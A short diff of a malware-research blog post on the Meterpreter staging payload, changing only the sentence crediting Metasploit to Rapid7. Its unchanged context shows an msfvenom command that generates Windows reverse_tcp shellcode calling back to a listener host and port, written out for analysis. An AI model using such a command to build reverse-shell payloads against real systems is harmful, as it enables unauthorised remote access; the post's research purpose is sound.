@@ -5,7 +5,7 @@ date:   2023-09-17 00:00:00 +0000
 categories: malware
 ---
 
-This blog entry covers personal technical research on the meterpreter staging payload. Meterpreter, developed by Metasploit, is a C2 framework used by white and black hats alike.
+This blog entry covers personal technical research on the meterpreter staging payload. Meterpreter, as part of the Metasploit framework developed by Rapid7, is a C2 framework used by white and black hats alike.
 
 To begin analysis, I generated a 32-bit Windows meterpreter shellcode with the command `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.128 LPORT=443 -f c`. The objective is to understand how the shellcode loads the necessary DLLs and executes the second stage payload.
 
